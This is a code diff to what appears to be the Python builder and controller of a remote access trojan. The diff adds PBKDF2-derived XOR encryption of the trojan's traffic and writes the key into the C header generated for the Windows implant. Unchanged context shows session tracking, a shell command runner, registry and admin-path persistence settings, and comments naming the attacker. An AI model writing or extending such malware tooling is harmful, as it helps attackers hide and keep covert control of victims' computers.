@@ -1,7 +1,10 @@
 from colorama import Fore,Style
 from subprocess import Popen
 from subprocess import PIPE
+from backports.pbkdf2 import pbkdf2_hmac
+
 import socket
+import binascii
 
 #CONSTANT:
 NB_SESSION = 0
@@ -19,23 +22,30 @@ SOCK_TIMEOUT = 4
 
 SPLIT = "|SPLIT|"
 #session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
-def XOREncryption(data):
-    key =["j","u","a","n"] 
+
+def XOREncryption(data,key):
+
     result = ""
-    print("LEN DATA: ",len(data))
+    char_xor = ""
+
     for x in range(len(data)):
        
         current = data[x]
-        #print("CURRENT: ",current)
-        #print("CMPT:",x)
+
         current_key  = key[x % len(key)]
-        #print("CURRENT KEY:", current_key)
+
+        char_xor = chr(ord(current) ^ ord(current_key))
         
-        result+= chr(ord(current) ^ ord(current_key))
-        print("char crypt: ",current,"result char xor: ",result[x],"cmpt: ",x)
-    
-    #print("payload-->", result)
+        result += char_xor
+
     return result
+
+def generate_PBKDF2_key(password, salt="CISCOTHEBOSS",iteration=10000 ,length=512): #Generates the key to encrypt and decrypt data using the XOR algorithm.
+    
+    password = password.encode()
+    salt = salt.encode()
+
+    return binascii.hexlify(pbkdf2_hmac("sha256", password, salt, iteration, length)).decode("utf8")
 
 def exec(command):
     with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
@@ -126,6 +136,7 @@ def commonHeader():
 #define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
 #define NAME_KEY_REGISTER  "win64" 
+#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
@@ -151,7 +162,7 @@ $USER is changed by the user who executed the program.
 """
     return header
 
-def customHeader(ip, auto, port, reco, name, token, registry): 
+def customHeader(ip, auto, port, reco, name, token, registry, key): 
     #In order not to have an error you need 4 \.
     #Example C:\ = C:\\\\
     header = """
@@ -168,6 +179,7 @@ def customHeader(ip, auto, port, reco, name, token, registry):
 #define NAME_PROG "{}" //Name of prog
 #define TOKEN "{}"
 #define NAME_KEY_REGISTER  "{}" 
+#define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
@@ -188,7 +200,7 @@ def customHeader(ip, auto, port, reco, name, token, registry):
 
 #endif
 
-""".format(ip, port, auto, reco, name,token, registry)
+""".format(ip, port, auto, reco, name,token, registry,key)
 
     return header
 
